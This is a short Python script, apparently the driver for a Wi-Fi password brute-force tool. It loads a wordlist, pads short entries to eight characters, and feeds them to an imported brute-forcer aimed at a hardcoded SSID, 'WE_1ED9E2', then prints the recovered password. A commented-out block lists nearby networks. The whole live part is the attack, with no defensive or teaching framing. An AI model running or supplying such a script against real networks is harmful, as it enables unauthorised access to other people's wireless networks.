#show network start
# from  showNet import shownetworks
# if __name__ == '__main__':
#     show_net_cl= shownetworks()
#     networks = show_net_cl.show_av_network()
#     print("bssid  ", "\t\tssid")
#     for networks in networks:
#         bssid = networks.bssid
#         ssid = networks.ssid
#         print(bssid, ssid)
#         print(type(ssid))
# show networks end

#bruteforse
from  wifi_brute_froce import  brforce
ppass = open('worddlist.txt','r')
pass_list = []
for pass1 in ppass:
    pass1 = str(pass1).replace('\n', '')
    if len(pass1)<8:
        pass1= pass1 + (int(8-len(pass1)))*"k"
    pass_list.append(str(pass1))
ssid = "WE_1ED9E2"
brute = brforce(ssid,pass_list)
real_pass = brute.getwifi()
print("ssid= ",ssid," pass= ",real_pass)
#bruteforce end